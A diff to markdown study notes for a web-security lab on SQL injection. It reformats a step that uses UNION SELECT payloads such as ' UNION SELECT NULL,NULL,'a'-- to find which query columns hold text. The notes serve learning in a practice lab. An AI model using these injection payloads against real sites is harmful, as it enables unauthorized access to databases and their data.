@@ -209,7 +209,12 @@ Lab video: https://www.youtube.com/watch?v=SGBTC5D7DTs1
 Notes: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-04/notes.txt
 **Step #2: Determine the data type of the columns**
 
-select a, b, c from table1 UNION select NULL, NULL, 'a'    ( '+UNION+SELECT+NULL,NULL,'a'--) or( '+UNION+SELECT+1,2--) depending on DB like MSsql or postgres etc.
+select a, b, c from table1 UNION select NULL, NULL, 'a' -- 
+
+```
+  ( '+UNION+SELECT+NULL,NULL,'a'--) or( '+UNION+SELECT+1,2--) depending on DB like MSsql or postgres etc.
+```
+  
 -> error -> column is not type text
 -> no error -> column is of type text
 
